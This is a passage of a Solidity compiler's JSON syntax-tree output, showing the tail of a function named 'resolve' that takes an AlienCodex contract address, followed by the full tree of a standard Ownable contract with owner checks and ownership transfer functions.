													"names": [],
													"nodeType": "FunctionCall",
													"src": "290:104:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 105,
												"nodeType": "ExpressionStatement",
												"src": "290:104:1"
											}
										]
									},
									"documentation": null,
									"id": 107,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "resolve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 73,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 72,
												"name": "alienCodexAddr",
												"nodeType": "VariableDeclaration",
												"scope": 107,
												"src": "138:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 71,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "138:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "137:24:1"
									},
									"returnParameters": {
										"id": 74,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "169:0:1"
									},
									"scope": 108,
									"src": "121:281:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 109,
							"src": "88:317:1"
						}
					],
					"src": "33:372:1"
				},
				"id": 1
			},
			"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol": {
				"ast": {
					"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol",
					"exportedSymbols": {
						"Ownable": [
							217
						]
					},
					"id": 218,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 110,
							"literals": [
								"solidity",
								"^",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:2"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 217,
							"linearizedBaseContracts": [
								217
							],
							"name": "Ownable",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 112,
									"name": "_owner",
									"nodeType": "VariableDeclaration",
									"scope": 217,
									"src": "48:22:2",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 111,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "48:7:2",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 118,
									"name": "OwnershipTransferred",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 117,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 114,
												"indexed": true,
												"name": "previousOwner",
												"nodeType": "VariableDeclaration",
												"scope": 118,
												"src": "104:29:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 113,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "104:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 116,
												"indexed": true,
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"scope": 118,
												"src": "135:24:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 115,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "135:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "103:57:2"
									},
									"src": "77:84:2"
								},
								{
									"body": {
										"id": 133,
										"nodeType": "Block",
										"src": "191:91:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 124,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 121,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 112,
														"src": "201:6:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 122,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "210:3:2",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 123,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "210:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "201:19:2",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 125,
												"nodeType": "ExpressionStatement",
												"src": "201:19:2"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 128,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "264:1:2",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 127,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "256:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 129,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "256:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 130,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 112,
															"src": "268:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 126,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 118,
														"src": "235:20:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 131,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "235:40:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 132,
												"nodeType": "EmitStatement",
												"src": "230:45:2"
											}
										]
									},
									"documentation": null,
									"id": 134,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 119,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "179:2:2"
									},
									"returnParameters": {
										"id": 120,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "191:0:2"
									},
									"scope": 217,
									"src": "167:115:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 141,
										"nodeType": "Block",
										"src": "335:30:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 139,
													"name": "_owner",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 112,
													"src": "352:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 138,
												"id": 140,
												"nodeType": "Return",
												"src": "345:13:2"
											}
										]
									},
									"documentation": null,
									"id": 142,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 135,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "302:2:2"
									},
									"returnParameters": {
										"id": 138,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 137,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 142,
												"src": "326:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 136,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "326:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "325:9:2"
									},
									"scope": 217,
									"src": "288:77:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 150,
										"nodeType": "Block",
										"src": "392:46:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 145,
																"name": "isOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 162,
																"src": "410:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_bool_$",
																	"typeString": "function () view returns (bool)"
																}
															},
															"id": 146,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "410:9:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 144,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															235,
															236
														],
														"referencedDeclaration": 235,
														"src": "402:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 147,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "402:18:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 148,
												"nodeType": "ExpressionStatement",
												"src": "402:18:2"
											},
											{
												"id": 149,
												"nodeType": "PlaceholderStatement",
												"src": "430:1:2"
											}
										]
									},
									"documentation": null,
									"id": 151,
									"name": "onlyOwner",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 143,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "389:2:2"
									},
									"src": "371:67:2",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 161,
										"nodeType": "Block",
										"src": "490:44:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													},
													"id": 159,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 156,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "507:3:2",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 157,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "507:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"id": 158,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 112,
														"src": "521:6:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "507:20:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"functionReturnParameters": 155,
												"id": 160,
												"nodeType": "Return",
												"src": "500:27:2"
											}
										]
									},
									"documentation": null,
									"id": 162,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "isOwner",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 152,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "460:2:2"
									},
									"returnParameters": {
										"id": 155,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 154,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 162,
												"src": "484:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 153,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "484:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "483:6:2"
									},
									"scope": 217,
									"src": "444:90:2",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 180,
										"nodeType": "Block",
										"src": "586:91:2",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 168,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 112,
															"src": "622:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 170,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "638:1:2",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 169,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "630:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 171,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "630:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 167,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 118,
														"src": "601:20:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 172,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "601:40:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 173,
												"nodeType": "EmitStatement",
												"src": "596:45:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 178,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 174,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 112,
														"src": "651:6:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 176,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "668:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																}
															],
															"id": 175,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "660:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": "address"
														},
														"id": 177,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "660:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "651:19:2",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 179,
												"nodeType": "ExpressionStatement",
												"src": "651:19:2"
											}
										]
									},
									"documentation": null,
									"id": 181,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 165,
											"modifierName": {
												"argumentTypes": null,
												"id": 164,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 151,
												"src": "576:9:2",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "576:9:2"
										}
									],
									"name": "renounceOwnership",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 163,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "566:2:2"
									},
									"returnParameters": {
										"id": 166,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "586:0:2"
									},
									"scope": 217,
									"src": "540:137:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 192,
										"nodeType": "Block",
										"src": "745:45:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 189,
															"name": "newOwner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 183,
															"src": "774:8:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 188,
														"name": "_transferOwnership",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 216,
														"src": "755:18:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$returns$__$",
															"typeString": "function (address)"
														}
													},
													"id": 190,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "755:28:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 191,
												"nodeType": "ExpressionStatement",
												"src": "755:28:2"
											}
										]
									},
									"documentation": null,
									"id": 193,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 186,
											"modifierName": {
												"argumentTypes": null,
												"id": 185,
												"name": "onlyOwner",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 151,
												"src": "735:9:2",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "735:9:2"
										}
									],
									"name": "transferOwnership",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 184,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 183,
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"scope": 193,
												"src": "710:16:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 182,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "710:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "709:18:2"
									},
									"returnParameters": {
										"id": 187,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "745:0:2"
									},
									"scope": 217,
									"src": "683:107:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 215,
										"nodeType": "Block",
										"src": "851:128:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 203,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 199,
																"name": "newOwner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 195,
																"src": "869:8:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 201,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "889:1:2",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 200,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "881:7:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 202,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "881:10:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "869:22:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 198,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															235,
															236
														],
														"referencedDeclaration": 235,
														"src": "861:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 204,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "861:31:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 205,
												"nodeType": "ExpressionStatement",
												"src": "861:31:2"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 207,
															"name": "_owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 112,
															"src": "928:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 208,
															"name": "newOwner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 195,
															"src": "936:8:2",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 206,
														"name": "OwnershipTransferred",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 118,
														"src": "907:20:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$returns$__$",
															"typeString": "function (address,address)"
														}
													},
													"id": 209,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "907:38:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 210,
												"nodeType": "EmitStatement",
												"src": "902:43:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 213,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 211,
														"name": "_owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 112,
														"src": "955:6:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 212,
														"name": "newOwner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 195,
														"src": "964:8:2",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "955:17:2",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 214,
												"nodeType": "ExpressionStatement",
												"src": "955:17:2"
											}
										]
									},
									"documentation": null,
									"id": 216,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transferOwnership",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 196,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 195,
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"scope": 216,
												"src": "824:16:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 194,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "824:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "823:18:2"
									},
									"returnParameters": {
										"id": 197,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "851:0:2"
									},
									"scope": 217,
									"src": "796:183:2",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 218,
							"src": "25:956:2"
						}
					],
					"src": "0:982:2"
				},
				"id": 2
			}
		}
	}
}